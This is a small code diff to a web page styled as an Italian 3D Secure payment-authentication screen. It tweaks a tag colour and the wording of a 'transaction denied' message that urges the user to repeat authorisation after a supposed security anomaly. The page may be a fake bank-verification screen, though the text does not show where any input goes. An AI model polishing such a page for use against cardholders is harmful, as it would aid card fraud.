@@ -34,11 +34,11 @@
       margin: 8px 0;
     }
 
-    .secure-tag {
-      font-size: 14px;
-      color: #00ff88;
-      margin-top: -10px;
-      margin-bottom: 20px;
+  .secure-tag {
+    font-size: 14px;
+    color: rgb(26, 110, 75);
+    margin-top: -10px;
+    margin-bottom: 20px;
     }
 
     .timer {
@@ -165,7 +165,7 @@
     card.innerHTML = `
       <img src="fail.png" alt="Errore" class="result-image">
       <h2 style="color: rgb(251, 18, 34);">Transazione Negata</h2>
-      <p>${msg ?? "L'autenticazione 3D Secure non è stata completata."}</p>
+      <p>${msg ?? "L'autenticazione 3D Secure non è andata a buon fine."}</p>
       <p>Il sistema ha rilevato un'anomalia di sicurezza, è necessario ripetere l'operazione di autorizzazione.</p>
       <button class="riprovare" onclick="location.reload()">RIPROVA</button>
     `;
